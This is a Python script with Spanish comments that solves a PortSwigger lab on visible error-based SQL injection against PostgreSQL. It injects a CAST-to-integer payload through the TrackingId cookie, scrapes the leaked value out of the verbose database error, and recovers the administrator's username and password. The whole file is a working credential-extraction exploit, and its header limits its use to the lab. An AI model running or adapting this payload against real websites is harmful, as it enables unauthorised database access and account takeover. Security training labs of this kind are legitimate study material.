#!/usr/bin/env python3
"""
Visible error-based SQL injection (PostgreSQL) - lab de PortSwigger.

TRUCO: forzamos un error de conversion (texto -> entero) con CAST. El error
de la base de datos INCLUYE el dato dentro del mensaje. Lo leemos del cuerpo
de la respuesta. Quitamos el valor aleatorio del TrackingId porque la cookie
se TRUNCA (hay limite de longitud) y si no, el payload no cabe.

USO: solo en el lab. En Kali:
    python3 extraer_visible_error.py

Si el lab se reinicio, actualiza LAB y SESSION con lo que veas en Burp.
"""
import re
import sys

try:
    import requests
except ImportError:
    sys.exit("Falta 'requests'. Instala con: pip install requests")

# ----- CONFIGURA ESTO -----
LAB     = "https://0aad0047048efafe801853fc000d00b8.web-security-academy.net"
SESSION = "Uwcl29NiSsLIx8FcQqWCGwAZn47f8D21"
# --------------------------


def pedir(columna):
    """Inyecta CAST sobre 'columna' y devuelve (status, texto_respuesta)."""
    payload = f"' AND 1=CAST((SELECT {columna} FROM users LIMIT 1) AS int)-- "
    cookie = f"TrackingId={payload}; session={SESSION}"
    r = requests.get(LAB + "/", headers={"Cookie": cookie}, timeout=15)
    return r.status_code, r.text


def extraer(texto):
    """Busca el dato filtrado en el mensaje de error."""
    m = re.search(r'invalid input syntax for (?:type )?integer:\s*"?([^"\n<]+)', texto)
    return m.group(1).strip() if m else None


def intentar(columna):
    status, texto = pedir(columna)
    print(f"[*] {columna}: HTTP {status}")
    dato = extraer(texto)
    if dato:
        return dato
    # Diagnostico: enseña las lineas que parezcan de error
    print("    [!] No encontre el patron del error. Lineas sospechosas:")
    vistas = 0
    for linea in texto.splitlines():
        l = linea.strip()
        if any(k in l.lower() for k in ("error", "invalid", "integer", "exception", "syntax")):
            print("      >", l[:200])
            vistas += 1
    if vistas == 0:
        print("      (ninguna; el servidor no devolvio error verboso)")
    return None


def main():
    print("[*] Fugando el usuario...")
    user = intentar("username")
    print(f"[+] username -> {user}\n")

    print("[*] Fugando la contrasena...")
    pw = intentar("password")
    print(f"[+] password -> {pw}\n")

    if pw:
        print("=" * 50)
        print(f"  CONTRASENA de administrator: {pw}")
        print("=" * 50)
        print(f"\nLogin: administrator / {pw}")
    else:
        print("[!] No salio. Mandame la salida de arriba (las 'lineas sospechosas')")
        print("    y ajustamos el payload.")


if __name__ == "__main__":
    main()
